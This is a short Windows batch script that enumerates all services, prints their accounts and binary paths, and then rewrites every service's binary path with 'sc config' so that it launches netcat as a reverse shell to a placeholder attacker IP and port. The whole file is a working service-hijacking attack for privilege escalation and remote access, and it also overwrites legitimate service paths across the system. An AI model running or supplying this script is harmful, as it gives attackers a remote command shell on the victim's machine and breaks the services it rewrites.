@echo off
setlocal EnableDelayedExpansion
sc  query state= all | findstr SERVICE_NAME > services.lst
for /f "tokens=1,2" %%A in (services.lst) do (
    echo %%B
    sc qc %%B | findstr "NT AUTHORITY\LocalService"
    sc qc %%B | findstr BINARY_PATH_NAME
    sc config %%B binpath= "C:\Users\Public\nc.exe <AttackerIP> <AttackerPort> -e C:\WINDOWS\System32\cmd.exe"

)
